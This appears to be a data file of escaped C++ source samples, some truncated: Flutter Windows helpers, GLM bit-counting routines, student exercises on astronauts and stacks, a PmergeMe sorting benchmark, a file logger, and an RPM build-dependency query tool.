    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <glm/glm.hpp>\n#include <cstdio>\n#include <cstdlib>     //To define \"exit\", req'd by XLC.\n#include <ctime>\n\nint nlz(unsigned x)\n{\n\tint pop(unsigned x);\n\n\tx = x | (x >> 1);\n\tx = x | (x >> 2);\n\tx = x | (x >> 4);\n\tx = x | (x >> 8);\n\tx = x | (x >>16);\n\treturn pop(~x);\n}\n\nint pop(unsigned x)\n{\n\tx = x - ((x >> 1) & 0x55555555);\n\tx = (x & 0x33333333) + ((x >> 2) & 0x33333333);\n\tx = (x + (x >> 4)) & 0x0F0F0F0F;\n\tx = x + (x << 8);\n\tx = x + (x << 16);\n\treturn x >> 24;\n}\n\nint ntz1(unsigned x)\n{\n\treturn 32 - nlz(~x & (x-1));\n}\n\nint ntz2(unsigned x)\n{\n\treturn pop(~x & (x - 1));\n}\n\nint ntz3(unsigned x)\n{\n\tint n;\n\n\tif (x == 0) return(32);\n\tn = 1;\n\tif ((x & 0x0000FFFF) == 0) {n = n +16; x = x >>16;}\n\tif ((x & 0x000000FF) == 0) {n = n + 8; x = x >> 8;}\n\tif ((x & 0x0000000F) == 0) {n = n + 4; x = x >> 4;}\n\tif ((x & 0x00000003) == 0) {n = n + 2; x = x >> 2;}\n\treturn n - (x & 1);\n}\n\nint ntz4(unsigned x)\n{\n\tunsigned y;\n\tint n;\n\n\tif (x == 0) return 32;\n\tn = 31;\n\ty = x <<16;  if (y != 0) {n = n -16;  x = y;}\n\ty = x << 8;  if (y != 0) {n = n - 8;  x = y;}\n\ty = x << 4;  if (y != 0) {n = n - 4;  x = y;}\n\ty = x << 2;  if (y != 0) {n = n - 2;  x = y;}\n\ty = x << 1;  if (y != 0) {n = n - 1;}\n\treturn n;\n}\n\nint ntz4a(unsigned x)\n{\n\tunsigned y;\n\tint n;\n\n\tif (x == 0) return 32;\n\tn = 31;\n\ty = x <<16;  if (y != 0) {n = n -16;  x = y;}\n\ty = x << 8;  if (y != 0) {n = n - 8;  x = y;}\n\ty = x << 4;  if (y != 0) {n = n - 4;  x = y;}\n\ty = x << 2;  if (y != 0) {n = n - 2;  x = y;}\n\tn = n - ((x << 1) >> 31);\n\treturn n;\n}\n\nint ntz5(char x)\n{\n\tif (x & 15) {\n\t\tif (x & 3) {\n\t\t\tif (x & 1) return 0;\n\t\t\telse return 1;\n\t\t}\n\t\telse if (x & 4) return 2;\n\t\telse return 3;\n\t}\n\telse if (x & 0x30) {\n\t\tif (x & 0x10) return 4;\n\t\telse return 5;\n\t}\n\telse if (x & 0x40) return 6;\n\telse if (x) return 7;\n\telse return 8;\n}\n\nint ntz6(unsigned x)\n{\n\tint n;\n\n\tx = ~x & (x - 1);\n\tn = 0;\t\t\t\t// n = 32;\n\twhile(x != 0)\n\t{\t\t\t\t\t// while (x != 0) {\n\t\tn = n + 1;\t\t//    n = n - 1;\n\t\tx = x >> 1;\t\t//    x = x + x;\n\t}\t\t\t\t\t// }\n\treturn n;\t\t\t// return n;\n}\n\nint ntz6a(unsigned x)\n{\n\tint n = 32;\n\n\twhile (x != 0) {\n\t\tn = n - 1;\n\t\tx = x + x;\n\t}\n\treturn n;\n}\n\n/* Dean Gaudet's algorithm. To be most useful there must be a good way\nto evaluate the C \"conditional expression\" (a?b:c construction) without\nbranching. The result of a?b:c is b if a is true (nonzero), and c if a\nis false (0).\n   For example, a compare to zero op that sets a target GPR to 1 if the\noperand is 0, and to 0 if the operand is nonzero, will do it. With this\ninstruction, the algorithm is entirely branch-free. But the most\ninteresting thing about it is the high degree of parallelism. All six\nlines with conditional expressions can be executed in parallel (on a\nmachine with sufficient computational units).\n   Although the instruction count is 30 measured statically, it could\nexecute in only 10 cycles on a machine with sufficient parallelism.\n   The first two uses of y can instead be x, which would increase the\nuseful parallelism on most machines (the assignments to y, bz, and b4\ncould then all run in parallel). */\n\nint ntz7(unsigned x)\n{\n\tunsigned y, bz, b4, b3, b2, b1, b0;\n\n\ty = x & -x;               // Isolate rightmost 1-bit.\n\tbz = y ? 0 : 1;           // 1 if y = 0.\n\tb4 = (y & 0x0000FFFF) ? 0 : 16;\n\tb3 = (y & 0x00FF00FF) ? 0 : 8;\n\tb2 = (y & 0x0F0F0F0F) ? 0 : 4;\n\tb1 = (y & 0x33333333) ? 0 : 2;\n\tb0 = (y & 0x55555555) ? 0 : 1;\n\treturn bz + b4 + b3 + b2 + b1 + b0;\n}\n\n// This file has divisions by zero to test isnan\n#if GLM_COMPILER & GLM_COMPILER_VC\n#\tpragma warning(disable : 4800)\n#endif\n\nint ntz7_christophe(unsigned x)\n{\n\tunsigned y, bz, b4, b3, b2, b1, b0;\n\n\ty = x & -x;               // Isolate rightmost 1-bit.\n\tbz = unsigned(!bool(y));           // 1 if y = 0.\n\tb4 = unsigned(!bool(y & 0x0000FFFF)) * 16;\n\tb3 = unsigned(!bool(y & 0x00FF00FF)) * 8;\n\tb2 = unsigned(!bool(y & 0x0F0F0F0F)) * 4;\n\tb1 = unsigned(!bool(y & 0x33333333)) * 2;\n\tb0 = unsigned(!bool(y & 0x55555555)) * 1;\n\treturn bz + b4 + b3 + b2 + b1 + b0;\n}\n\n/* Below is David Seal's algorithm, found at\nhttp://www.ciphersbyritter.com/NEWS4/BITCT.HTM Table\nentries marked \"u\" are unused. 6 ops including a\nmultiply, plus an indexed load. */\n\n#define u 99\nint ntz8(unsigned x)\n{\n\tstatic char table[64] =\n\t\t{32, 0, 1,12, 2, 6, u,13,   3, u, 7, u, u, u, u,14,\n\t\t10, 4, u, u, 8, u, u,25,   u, u, u, u, u,21,27,15,\n\t\t31,11, 5, u, u, u, u, u,   9, u, u,24, u, u,20,26,\n\t\t30, u, u, u, u,23, u,19,  29, u,22,18,28,17,16, u};\n\n\tx = (x & -x)*0x0450FBAF;\n\treturn table[x >> 26];\n}\n\n/* Seal's algorithm with multiply expanded.\n9 elementary ops plus an indexed load. */\n\nint ntz8a(unsigned x)\n{\n\tstatic char table[64] =\n\t\t{32, 0, 1,12, 2, 6, u,13,   3, u, 7, u, u, u, u,14,\n\t\t10, 4, u, u, 8, u, u,25,   u, u, u, u, u,21,27,15,\n\t\t31,11, 5, u, u, u, u, u,   9, u, u,24, u, u,20,26,\n\t\t30, u, u, u, u,23, u,19,  29, u,22,18,28,17,16, u};\n\n\tx = (x & -x);\n\tx = (x << 4) + x;    // x = x*17.\n\tx = (x << 6) + x;    // x = x*65.\n\tx = (x << 16) - x;   // x = x*65535.\n\treturn table[x >> 26];\n}\n\n/* Reiser's algorith",
    "#include <iostream>\n#include <string>\n#include <vector>\n#include \"astronauta.h\"\n#include \"voo.h\"\nusing std::string;\nusing std::vector;\n\n\n\nint main() {\n  vector<voo> voos;\n  vector<astronauta> astronautas;\n    int opcao;\n  \n    do {\n      std::cout << \"Pressione um n\u00famero para executar uma a\u00e7\u00e3o:\" << std::endl<< std::endl;\n      std::cout << \"1- Cadastrar astronauta\" << std::endl;\n      std::cout << \"2- Cadastrar voo\" << std::endl;\n      std::cout << \"3- listar astronautas\" << std::endl;\n      std::cout << \"4- listar astronautas mortos\" << std::endl;\n      std::cout << \"5- adicionar astronauta em um voo\" << std::endl;\n      std::cout << \"6- remover astronauta em um voo\" << std::endl;\n      std::cout << \"7- listar tripula\u00e7\u00e3o de um voo\" << std::endl;\n      std::cout << \"8- lan\u00e7ar um voo\" << std::endl;\n      std::cout << \"9- pousar um voo\" << std::endl;\n      std::cout << \"10- explodir um voo\" << std::endl;\n      std::cout << \"11- listar todos os voos\" << std::endl;\n      std::cin >> opcao;\n\n// switch ficou bugando pela formata\u00e7\u00e3o, intakavelmente, ent\u00e3o fiz um if else.\n// cadastrar astronauta\n      if (opcao == 1){\n\n        string cpf;\n        string nome;\n        int idade;\n        std::cout << \"Digite o nome do astronauta:\" << std::endl;\n        std::getline(std::cin>>std::ws, nome);\n        std::cout << \"Digite o CPF do astronauta:\" << std::endl;\n        std::cin >> cpf;\n        std::cout << \"Digite a idade do astronauta:\" << std::endl;\n        std::cin >> idade;\n        astronauta astronauta(cpf, nome, idade);\n        astronautas.push_back(astronauta); \n      }\n//cadastrar voo\n      if (opcao == 2){\n        int codigo;\n        std::cout << \"insira o codigo do voo\" << std::endl;\n        std::cin >> codigo;\n        voo voo(codigo);\n        voos.push_back(voo);\n      }\n//listar astronautas\n      if (opcao == 3){\n        for (int i = 0; i < astronautas.size(); i++){\n          std::cout <<\" - \"<< astronautas[i].get_nome() << \" \";\n          if(astronautas[i].get_vivo()==false){\n            std::cout <<std::endl << \"// status quote: [morto]\" <<  std::endl<< std::endl;\n          }else if (astronautas[i].get_vivo()==true){\n            std::cout <<std::endl << \"// status quote: [vivo]\"  << std::endl<< std::endl;\n          }\n        }\n      }\n//listar astronautas mortos\n      if (opcao == 4){\n        for (int i = 0; i < astronautas.size(); i++){\n          if(astronautas[i].get_vivo()==false){\n            std::cout << \"nome:\" << astronautas[i].get_nome()<< std::endl<<\"cpf:\"<< astronautas[i].get_cpf()<< std::endl << \"miss\u00f5es concluidas:\"<< std::endl;\n            for(int j = 0; j < astronautas[i].missoes_concluidas.size(); j++){\n              if(j==astronautas[i].missoes_concluidas.size()-1){\n                std::cout << astronautas[i].missoes_concluidas[j] << \" [ultimo voo participado]\";\n              }else{ std::cout << astronautas[i].missoes_concluidas[j] << \" [com sucesso]\" << std::endl;}\n            }\n          }\n        }\n      }\n//adicionar astronauta a um voo por cpf\n      if (opcao == 5){\n        string cpf;\n        std::cout << \"insira o cpf do astronauta:\" << std::endl;\n        std::cin >> cpf;\n        bool astronauta_existe = false;\n        for (int i = 0; i < astronautas.size(); i++){\n          if(astronautas[i].get_cpf()==cpf){\n            astronauta_existe = true;\n            if (astronautas[i].get_vivo()==true){\n              if (astronautas[i].get_disponivel()==true){\n                int codigo;\n                std::cout << \"insira o codigo do voo:\" << std::endl;\n                std::cin >> codigo;\n                bool voo_encontrado = false;\n                for (int j = 0; j < voos.size(); j++){\n                  if(voos[j].get_codigo()==codigo){\n                    voo_encontrado = true;\n                    if(voos[j].get_ativo()==false){\n                      voos[j].esteve_no_voo.push_back(astronautas[i]);\n                      voos[j].tripulantes.push_back(astronautas[i]);\n                      astronautas[i].disponivel=false;\n                      std::cout << \"Astronauta adicionado com sucesso ao voo.\" << std::endl;\n                    }else{std::cout << \"Voo j\u00e1 est\u00e1 ativo.\" << std::endl;}\n                  \n                }\n              }\n              if (!voo_encontrado) {\n                std::cout << \"Voo n\u00e3o encontrado.\" << std::endl;\n              }\n            }else {std::cout <<\"Astronauta n\u00e3o est\u00e1 dispon\u00edvel para o voo.\" << std::endl;}\n          }else {std::cout << \"Astronauta esta morto.\" << std::endl;}\n          }\n        }\n        if (!astronauta_existe) {\n          std::cout << \"Astronauta n\u00e3o encontrado.\" << std::endl;\n        }\n      }\n//remover astronauta de um voo por cpf\n      if (opcao == 6){\n        string cpf;\n        std::cout << \"insira o cpf do astronauta:\" << std::endl;\n        std::cin >> cpf;\n        for (int i = 0; i < astronautas.size(); i++){\n          if(astronautas[i].get_cpf()==cpf){\n            int codigo;\n            std::cout << \"insira o codigo do voo:\" << std",
    "#include <iostream>\n#include <vector>\n#include <list>\n#include <deque>\n#include <algorithm>\n#include <ctime>\n#include <cstdlib>\n#include <x86intrin.h>\n#include \"PmergeMe.hpp\"\n\n#define CACHE_LINE 64\n\nint main(__attribute__((unused))int argc, __attribute__((unused)) char** argv)\n{\n\t// Test about PmergeMpe.hpp\n#if 0\n\n\tfor (int t = 0; t < 1000000; t++)\n\t{\n\t\tstd::vector<int> v1;\n\t\tv1.reserve(5);\n\n\t\tfor (int i = 0; i < 5; i++)\n\t\t\tv1.push_back(rand()%5);\n\n\t\tstd::cout << \"Before : \";\n\t\tfor (std::vector<int>::iterator it = v1.begin(); it != v1.end(); it++)\n\t\t\tstd::cout << *it << \" \";\n\t\tstd::cout << std::endl;\n\n\t\tPmergeMe<std::vector<int> > p1;\n\t\tp1.sort(v1);\n\n\t\tstd::cout << \"Sorted vector: \";\n\t\tfor (std::vector<int>::iterator it = v1.begin(); it != v1.end(); it++)\n\t\t\tstd::cout << *it << \" \";\n\t\tstd::cout << std::endl;\n\n\t\t// check if the vector is sorted\n\t\tstd::cout << \"Is the vector sorted? \" << std::boolalpha << std::is_sorted(v1.begin(), v1.end()) << std::endl;\n\t}\n\t\t__attribute__((unused))\n\t\tint n;\n\t\tstd::cin >> n;\n\t\t// // check count of elements\n\t\t// std::cout << \"Count of elements: \" << v1.size() << std::endl;\n\t\t// // original count\n\t\t// std::cout << \"Original count of elements: \" << argc - 1 << std::endl;\n#endif\n\n\t// Mandatory specification performance test\n#if 1\n\tstd::srand(std::time(0));\n\n\tstd::vector<int> v;\n\tstd::deque<int> d;\n\tstd::list<int> l;\n\n\tdouble vectorTimeMicroSec = 0;\n\tdouble dequeTimeMicroSec = 0;\n\n\t// Print input\n\tstd::cout << \"Before : \";\n\tfor (int i = 1; i < argc; i++)\n\t\tstd::cout << argv[i] << \" \";\n\tstd::cout << std::endl;\n\n\t// Flush the cache\n\t__builtin_ia32_mfence();\n\t{\n\t\tfor (int i = 0; i < argc; i++)\n\t\t\tfor (size_t j = 0; j < std::strlen(argv[i]); j += CACHE_LINE)\n\t\t\t\t__builtin_ia32_clflush((char*)&argv[i][j]);\n\t\tfor (int i = 0; i < argc; i += CACHE_LINE / sizeof(char*))\n\t\t\t__builtin_ia32_clflush((char*)&argv[i]);\n\n\t\tenum { N = 1024 * 1024 * 64 };\n\t\tvolatile char* arr = new char[N];\n\t\tfor (int i = 0; i < N * 2; i++)\n\t\t\tarr[std::rand() % (N / CACHE_LINE) * CACHE_LINE] = 0;\n\t\tdelete[] arr;\n\t}\n\n\t// Fill the deque\n\t__builtin_ia32_mfence();\n\td.resize(argc - 1);\n\tfor (int i = 0; i < argc - 1; i++)\n\t{\n\t\td[i] = std::atoi(argv[i + 1]);\n\t}\n\n\t// Sort deque\n\t__builtin_ia32_mfence();\n\t{\n\t\tstd::clock_t start = std::clock();\n\t\t{\n\t\t\tPmergeMe<std::deque<int> > p;\n\t\t\tp.sort(d);\n\t\t}\n\t\tstd::clock_t end = std::clock();\n\t\tdequeTimeMicroSec = (end - start) / (CLOCKS_PER_SEC / 1000 / 1000);\n\t}\n\n\t// Flush the cache\n\t__builtin_ia32_mfence();\n\t{\n\t\tfor (int i = 0; i < argc; i++)\n\t\t\tfor (size_t j = 0; j < std::strlen(argv[i]); j += CACHE_LINE)\n\t\t\t\t__builtin_ia32_clflush((char*)&argv[i][j]);\n\t\tfor (int i = 0; i < argc; i += CACHE_LINE / sizeof(char*))\n\t\t\t__builtin_ia32_clflush((char*)&argv[i]);\n\n\t\tenum { N = 1024 * 1024 * 64 };\n\t\tvolatile char* arr = new char[N];\n\t\tfor (int i = 0; i < N * 2; i++)\n\t\t\tarr[std::rand() % (N / CACHE_LINE) * CACHE_LINE] = 0;\n\t\tdelete[] arr;\n\t}\n\n\t// Fill the vector\n\t__builtin_ia32_mfence();\n\tv.resize(argc - 1);\n\tfor (int i = 0; i < argc - 1; i++)\n\t{\n\t\tv[i] = std::atoi(argv[i + 1]);\n\t}\n\n\t// Sort vector\n\t__builtin_ia32_mfence();\n\t{\n\t\tstd::clock_t start = std::clock();\n\t\t{\n\t\t\tPmergeMe<std::vector<int> > p;\n\t\t\tp.sort(v);\n\t\t}\n\t\tstd::clock_t end = std::clock();\n\t\tvectorTimeMicroSec = (end - start) / (CLOCKS_PER_SEC / 1000 / 1000);\n\t}\n\n\t// Print result\n\t__builtin_ia32_mfence();\n\tstd::cout << \"After  : \";\n\tfor (std::vector<int>::iterator it = v.begin(); it != v.end(); it++)\n\t\tstd::cout << *it << \" \";\n\tstd::cout << std::endl;\n\n\tstd::cout << \"std::deque  time: \" << dequeTimeMicroSec << \" us\" << std::endl;\n\tstd::cout << \"std::vector time: \" << vectorTimeMicroSec << \" us\" << std::endl;\n\n\t// check if the vector is sorted\n\tstd::cout << \"Is the vector sorted? \" << std::boolalpha << std::is_sorted(v.begin(), v.end()) << std::endl;\n\n#endif\n\n\treturn 0;\n}\n",
    "#include <iostream>\nusing namespace std;\nstruct sommet{\n\tint inf;\n\tsommet*suivante;\n};\nvoid empiler(sommet*&yasser,int vale){\n\tsommet*nouveau=new sommet;\n\tnouveau->inf=vale;\n\tnouveau->suivante=yasser;\n\tyasser=nouveau;\n}\nvoid creear(sommet*&yasser,int n){\n\tint vale;\n\tfor(int i=0;i<n;i++){\n\t\t\tcout<<\"saisire la valeure de lelement\"<<i+1<<endl;\n\t\t\tcin>>vale;\n\t\t\tempiler(yasser,vale);\n\t}\n}\nvoid depeler(sommet*&yasser,int& x){\n\tsommet*supe=yasser;\n\tyasser=yasser->suivante;\n    x=supe->inf;\n\tdelete supe;\n}\nvoid aficher(sommet*yasser){\n\twhile(yasser!=0){\n\t\tcout<<yasser->inf<<endl;\n\t\tyasser=yasser->suivante;\n\t}\n\n}\nvoid minimume(sommet*yasser,int &y){\n\ty=yasser->inf;\n\twhile(yasser!=0){\n\t\tif(y>yasser->inf){\n\t\t\ty=yasser->inf;}\n\t\t\tyasser=yasser->suivante;\n\t}\n\tcout<<\"le minilule est\"<<y<<endl;\n\n}\nvoid supmine(sommet*&yasser,sommet*&intr,int y,int n){\n\tint val,cnt;\n\tcnt=0;\n\n\tfor(int i=0;i<n;i++){\n\t\tif(yasser->inf==y){\n        cnt=cnt+1;}\n\t\telse{\n\t\tdepeler(yasser,val);\n\t\tempiler(intr,val);}\n\t\t}\n\t\t\tcout<<\"le nbr de minimume est\"<<cnt<<endl;\n\n}\nint main(){\n\tsommet*yasser,*intr;\n\tintr=0;\n\tyasser=0;\n\tint n,y;\n\tcout<<\"saisire la taille de la pille\";\n\tcin>>n;\n\tcreear(yasser,n);\n\tcout<<\"la pille est\"<<endl;\n\taficher(yasser);\n\tminimume(yasser,y);\n\tsupmine(yasser,intr,y,n);\n\t\tcout<<\"la pille sans mine est\"<<endl;\n    \taficher(intr);\n\n}\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
    "#include \"Logger.h\"\n\n#include <cassert>\n\n#include <iostream>\n\n#include \"Linx/System/Time.h\"\n#include \"Linx/Utils/Template.h\"\n\nusing namespace Linx;\nusing namespace std;\n\nLoggerBuf* LoggerBuf::Open()\n{\n\tWrittenLen = 0;\n\tLastMilliSeconds = GetTotalMilliSeconds();\n\n\tFile.open(Filename + GetTimeString(\".%Y-%m-%d_%H-%M-%S.log\"), ios_base::app | ios_base::out);\n\tif (File.is_open())\n\t{\n\t\treturn this;\n\t}\n\telse\n\t{\n\t\treturn nullptr;\n\t}\n}\n\nvoid LoggerBuf::Close() noexcept\n{\n\tFile.close();\n}\n\nint LoggerBuf::sync()\n{\n\tif (CurrentLevel < LogLevel)\n\t{\n\t\tstr(\"\"); // Clear stream\n\t\tLock();\n\t\treturn 0;\n\t}\n\tassert(IsOpen());\n\n\tstd::string Time = GetTimeString(\"[%Y-%m-%d %H:%M:%S.%s] \");\n\tif (bPrintable)\n\t{\n\t\tcout << Time << str();\n\t\tcout.flush();\n\t}\n\tFile << Time << str();\n\tFile.flush();\n\n\t// Log rotate\n\n\tWrittenLen += (Time.size() + str().size());\n\tif (SplitSize > 0 && WrittenLen >= SplitSize)\n\t{\n\t\tRotate();\n\t}\n\t// Time alignment\n\telse if (SplitMilliSeconds > 0 && GetTotalMilliSeconds() / SplitMilliSeconds > LastMilliSeconds / SplitMilliSeconds)\n\t{\n\t\tRotate();\n\t}\n\n\tstr(\"\"); // Clear stream\n\n\tUnlock();\n\treturn 0;\n}\n\nvoid LoggerBuf::Rotate() noexcept\n{\n\tClose();\n\tOpen();\n}\n\n\nLogger::Logger(const string& InFilename, ELogLevel::Type InLevel) :\n\tSuper(addressof(Buf))\n{\n\tOpen(InFilename);\n\tBuf.LogLevel = InLevel;\n}\n\nvoid Logger::Open(const std::string& InFilename)\n{\n\tBuf.Filename = InFilename;\n\tif (!Buf.Open())\n\t{\n\t\tthrow std::logic_error(\"Open log file failed: \" + string(InFilename));\n\t}\n}\n\nvoid Logger::Close() noexcept\n{\n\tBuf.Close();\n}\n",
    "#include <rpm/rpmds.h>\n#include <rpm/rpmts.h>\n#include <rpm/rpmio.h>\n#include <rpm/rpmlib.h>\n#include <rpm/rpmtag.h>\n#include <rpm/rpmlog.h>\n\n#include <rpm/rpmspec.h>\n\n#include <fcntl.h>\n\n#include <fstream>\n#include <iostream>\n#include <filesystem>\n#include <set>\n#include <stdexcept>\n#include <map>\n#include <vector>\n\n#include \"shared.h\"\n\nstruct File_desctiptor\n{\n\tFD_t fd_;\n\t\n\t~File_desctiptor()\n\t{\n\t\tFclose(fd_);\n\t}\n\t\n\tstatic File_desctiptor fopen(const char* filename, const char* mode)\n\t{\n\t\tauto result = Fopen(filename, mode);\n\t\tif (Ferror(result) != 0)\n\t\t{\n\t\t\tthrow std::runtime_error(Fstrerror(result));\n\t\t}\n\t\treturn File_desctiptor(result);\n\t}\n\t\n\toperator FD_t()\n\t{\n\t\treturn fd_;\n\t}\n};\n\nstruct RPM_transaction\n{\n\trpmts ts_;\n\t\n\t~RPM_transaction()\n\t{\n\t\trpmtsFree(ts_);\n\t}\n\t\n\tstatic RPM_transaction create()\n\t{\n\t\treturn RPM_transaction(rpmtsCreate());\n\t}\n\t\n\toperator rpmts()\n\t{\n\t\treturn ts_;\n\t}\n};\n\nstruct RPM_dependency_set\n{\n\trpmds ds_;\n\t\n\t~RPM_dependency_set()\n\t{\n\t\trpmdsFree(ds_);\n\t}\n\t\n\tstatic RPM_dependency_set create(Header h, rpmTagVal tagN, int flags)\n\t{\n\t\treturn RPM_dependency_set(rpmdsNew(h, tagN, flags));\n\t}\n\t\n\toperator rpmds()\n\t{\n\t\treturn ds_;\n\t}\n};\n\nusing Files_map = std::map<std::string_view, std::vector<std::string>>;\nusing Whatprovides_map = std::map<std::string, std::vector<Files_map::iterator>>;\n\nstatic std::string_view static_current_build_require;\nstatic auto static_whatprovides = Whatprovides_map();\nstatic auto static_files = Files_map();\nstatic auto static_files_it = Files_map::iterator();\n\nstatic int callback_package_list([[maybe_unused]] QVA_t qva, rpmts ts, Header h)\n{\n\trpmfiFlags fiflags = (RPMFI_NOHEADER | RPMFI_FLAGS_QUERY | RPMFI_NOFILEDIGESTS);\n\tauto fi = rpmfiNew(ts, h, RPMTAG_BASENAMES, fiflags);\n\tfi = rpmfiInit(fi, 0);\n\twhile (rpmfiNext(fi) >= 0)\n\t{\n\t\tstatic_files_it->second.emplace_back(rpmfiFN(fi));\n\t}\n\trpmfiFree(fi);\n\treturn 0;\n}\n\nstatic int callback_what_provides([[maybe_unused]] QVA_t qva, rpmts ts, Header h)\n{\n\tauto td = rpmtd_s {};\n\tif (headerGet(h, RPMTAG_NVRA, &td, HEADERGET_EXT) == 0)\n\t{\n\t\tstd::clog << \"no nvra\" << \"\\n\";\n\t\treturn 1;\n\t}\n\tfor (char* nvra; nvra = const_cast<char*>(rpmtdNextString(&td)), nvra;)\n\t{\n\t\tauto [it, inserted] = static_files.try_emplace(std::string_view(nvra));\n\t\tstatic_whatprovides.try_emplace(std::string(static_current_build_require)).first->second.emplace_back(it);\n\t\tif (not inserted)\n\t\t{\n\t\t\tfree(nvra);\n\t\t\tcontinue;\n\t\t}\n\t\trpmQVKArguments_s args = {\n\t\t\t.qva_source = RPMQV_PACKAGE,\n\t\t\t.qva_sourceCount = 0,\n\t\t\t.qva_flags = QUERY_FOR_LIST,\n\t\t\t.qva_incattr = RPMFILE_NONE,\n\t\t\t.qva_excattr = RPMFILE_NONE,\n\t\t\t.qva_ofvattr = RPMVERIFY_NONE,\n\t\t\t// .qva_showPackage = nullptr,\n\t\t\t.qva_showPackage = &callback_package_list,\n\t\t\t.qva_specQuery = nullptr,\n\t\t\t.qva_queryFormat = nullptr,\n\t\t\t.qva_mode = 'q',\n\t\t};\n\t\tchar* const argv[] = {nvra, nullptr};\n\t\t\n\t\tstatic_files_it = it;\n\t\tint result = rpmcliQuery(ts, &args, argv);\n\t\tstatic_files_it = {};\n\t\tif (result != 0)\n\t\t{\n\t\t\treturn result;\n\t\t}\n\t}\n\treturn 0;\n}\n\nint main()\n{\n\tif (auto error = rpmReadConfigFiles(nullptr, nullptr); error != 0)\n\t{\n\t\tstd::clog << \"rpm error rpmReadConfigFiles: \" << error << \"\\n\";\n\t}\n\t\n\tauto accessed_files = std::set<std::string>();\n\t\n\t{\n\t\tauto ifs = std::ifstream(static_accessed_files);\n\t\twhile (ifs)\n\t\t{\n\t\t\tauto opened_file = std::string();\n\t\t\tstd::getline(ifs, opened_file);\n\t\t\taccessed_files.insert(opened_file);\n\t\t}\n\t}\n\t\n\tauto it = std::filesystem::directory_iterator(\"/builddir/build/SRPMS\");\n\tauto&& srpm = *it;\n\t\n\t{\n\t\tauto ts = RPM_transaction::create();\n\t\tauto fd = File_desctiptor::fopen(srpm.path().c_str(), \"r\");\n\t\trpmtsSetVSFlags(ts, RPMVSF_NOHDRCHK | RPMVSF_NOSHA1HEADER | RPMVSF_NODSAHEADER | RPMVSF_NORSAHEADER | RPMVSF_NOMD5 | RPMVSF_NODSA | RPMVSF_NORSA);\n\t\tHeader h = nullptr;\n\t\tint rc = rpmReadPackageFile(ts, fd, nullptr, &h);\n\t\tif (rc == RPMRC_NOTFOUND)\n\t\t{\n\t\t\tthrow std::runtime_error(\"not an RPM file\");\n\t\t}\n\t\tif (rc != RPMRC_OK && rc != RPMRC_NOTTRUSTED && rc != RPMRC_NOKEY)\n\t\t{\n\t\t\tthrow std::runtime_error(\"failed to parse RPM header\");\n\t\t}\n\t\t\n\t\t{\n\t\t\tauto ds = RPM_dependency_set::create(h, RPMTAG_REQUIRENAME, 0);\n\t\t\twhile (rpmdsNext(ds) >= 0)\n\t\t\t{\n\t\t\t\tauto ts = RPM_transaction::create();\n\t\t\t\tif (auto error = rpmtsSetRootDir(ts, \"/\"); error != 0)\n\t\t\t\t{\n\t\t\t\t\tstd::clog << \"rpm error rpmtsSetRootDir: \" << error << \"\\n\";\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\trpmQVKArguments_s args = {\n\t\t\t\t\t.qva_source = RPMQV_WHATPROVIDES,\n\t\t\t\t\t.qva_sourceCount = 1,\n\t\t\t\t\t.qva_flags = QUERY_FOR_DEFAULT,\n\t\t\t\t\t.qva_incattr = RPMFILE_NONE,\n\t\t\t\t\t.qva_excattr = RPMFILE_NONE,\n\t\t\t\t\t.qva_ofvattr = RPMVERIFY_NONE,\n\t\t\t\t\t.qva_showPackage = &callback_what_provides,\n\t\t\t\t\t.qva_specQuery = nullptr,\n\t\t\t\t\t.qva_queryFormat = nullptr,\n\t\t\t\t\t.qva_mode = 'q',\n\t\t\t\t};\n\t\t\t\tchar* const argv[] = {const_cast<char*>(rpmdsN(ds)), nullptr};\n\t\t\t\t\n\t\t\t\tif (static_current_build_require = *argv,\n\t\t\t\t\tstatic_current_build_require.starts_with(\"rpmlib(\") && static_current_build_require.ends_with(\")\"))\n\t\t\t\t{\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tif (auto error = rpmcliQuery(t",
